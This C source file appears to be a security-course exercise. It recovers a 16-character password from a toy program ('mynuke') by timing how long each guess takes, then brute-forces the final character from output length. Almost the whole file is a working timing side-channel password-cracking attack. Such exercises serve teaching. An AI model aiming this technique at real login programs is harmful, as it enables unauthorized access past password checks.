#include <stdio.h>
#include <stdint.h>	
#include <stdlib.h>	
#include <string.h>
#include <time.h>			/* for clock_gettime */
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define BILLION 1000000000L

int callNuke();
char password[16] = "AAAAAAAAAAAAAAAA";

int main(int argc, char **argv)
{
	int pid, status;
	pid_t endID;
	int fd[2];

	int correct = 0;
	int tmp = 0;

	uint64_t diff;
	struct timespec start, end;

	pipe(fd);

	for(int i = 0; i < 15; i++){
		int max_time = 0;
		char max_char = 'A';

		for(char guess = 'A'; guess <= 'Z'; guess++){
			password[i] = guess;
			int my_avg_time = 0;
			// repeat 5 times
			for(int k = 0; k < 5; k++){
				switch(pid = fork()){
				case -1:	/* error */
					perror("fork");
					exit(1);

				case 0:		/* child */
					tmp = callNuke(fd);
					exit(0);

				default:	/* parent */
					/* measure monotonic time */
					clock_gettime(CLOCK_MONOTONIC, &start);	/* mark start time */
					while(1){
						endID = waitpid(pid, &status, WNOHANG|WUNTRACED);
						if(endID == pid){
							clock_gettime(CLOCK_MONOTONIC, &end);	/* mark the end time */
							diff = BILLION * (end.tv_sec - start.tv_sec) + end.tv_nsec - start.tv_nsec;
							my_avg_time += (diff / 5);
								//printf("char %c #%d\n", guess, k);
								//printf("elapsed time = %llu nanoseconds\n", (long long unsigned int) diff);
							break;
						}
					}

				}
			}

			//printf("data is %s\n", password);
			//printf("char %c :\n", guess);
			//printf("elapsed time = %llu nanoseconds\n", (long long unsigned int) my_avg_time);

			/*
				once we have a correct character, mynuke will sleep for
				10000 miliseconds. If we can find out a char that its avg_time is bigger than 
				others avg_time for more than 10000000 in nanoseconds, then that is the correct
				character in this postion.
			*/

			if(my_avg_time < max_time){
				long long unsigned int x = (long long unsigned int) max_time - (long long unsigned int) my_avg_time;
				if(x > 10000000)
					break;
			}
			else if(my_avg_time > max_time && guess != 'A'){
				max_time = my_avg_time;
				max_char = guess;
				long long unsigned int x = (long long unsigned int) my_avg_time - (long long unsigned int) max_time;
				if(x > 10000000)
					break;
			}
			else if(my_avg_time > max_time && guess == 'A'){
				max_time = my_avg_time;
				max_char = guess;
			}
			else {}
		}

		password[i] = max_char;
	}

	for(char guess = 'A'; guess <= 'Z'; guess++){
		password[15] = guess;

		switch(pid = fork()){

		case -1:	/* error */
			perror("fork");
			exit(1);

		case 0:		/* child */
			correct = callNuke(fd);

			// callNuke return 10 means it finds the correct password.
			// otherwise not.
			if(correct == 10){
				for(int i = 0; i < 16; i++){
					printf("%c", password[i]);
				}
				printf("\n");
			}	
			exit(0);
			
		default:	/* parent */
			while(1){
				endID = waitpid(pid, &status, WNOHANG|WUNTRACED);
				if(endID == pid){
					break;
				}
			}	
		}

	}
	exit(0);
}

//char *target[] = { "/usr/local/bin/nuke", 0 };
char *target[] = { "./mynuke", 0 };

int callNuke(int pfd[]) {
	int pid, status, pid2;
	pid_t endID;
	int fd2[2];
	char buf[37];
	int n;

	switch (pid = fork()) {

	case -1:
		perror("fork");
		exit(1);

	case 0: 
		// child
		if (pipe(fd2) == -1) {
    		fprintf(stderr, "Pipe fd2 failed");
   	 		exit(1);
 	 	}

 	 	// write the password to the pipe and close the write-end.
		dup2(fd2[1],1);
		write(fd2[1], &password, 16);
		close(fd2[1]);

		close(pfd[0]);
		dup2(fd2[0],0);
		dup2(pfd[1],1);
		execvp(target[0], target);
		perror(target[0]);
		exit(1);	/* should not reach here */

	default: 
		/* parent will receive the output from its child */
		close(pfd[1]);
		dup2(pfd[0], 0);
		n = read(pfd[0], buf, 36);
		buf[n] = 0;
		while(1){
			endID = waitpid(pid, &status, WNOHANG|WUNTRACED);
			if(endID == pid){
				/*
					correct password -> nuke will output "ENTER LAUNCH CODE: LAUNCHING NUKES!"
					which is a 36 bytes string.
					wrong password -> nuke will output "ENTER LAUNCH CODE: ACCESS DENIED."
					which is a 34 bytes string.
				*/
				if(n == 36)
					return 10;
				else 
					return 0;
			}
		}
		break;
	}
	
}
